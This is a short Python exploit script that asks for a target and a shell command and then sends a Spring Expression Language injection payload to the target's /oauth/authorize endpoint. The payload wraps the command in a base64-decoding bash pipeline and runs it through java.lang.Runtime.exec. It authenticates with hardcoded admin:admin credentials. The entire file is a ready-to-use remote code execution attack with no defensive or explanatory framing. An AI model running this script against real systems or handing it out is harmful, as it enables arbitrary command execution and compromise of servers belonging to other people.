#!/usr/bin/env python
# coding:utf-8
# auther:xiaoZ

import requests
import base64

headers={"Authorization" : "Basic YWRtaW46YWRtaW4="}


target = input("Enter target to attack: ")
print("The attack target is ",target)
message = input('Enter cmd to encode: ')
message = 'bash -c {echo,%s}|{base64,-d}|{bash,-i}' % bytes.decode(base64.b64encode(message.encode('utf-8')))

poc = '${T(java.lang.Runtime).getRuntime().exec(T(java.lang.Character).toString(%s)' % ord(message[0])
for ch in message[1:]:
   poc += '.concat(T(java.lang.Character).toString(%s))' % ord(ch)
poc += ')}'

exp = target + '/oauth/authorize?response_type=' + poc + '&client_id=acme&scope=openid&redirect_uri=http://test'
print('The attack exp is ',exp)

try:
	response = requests.get(exp,headers=headers)
	print("attack done!")
except Exception as e:
	print("attack failed!")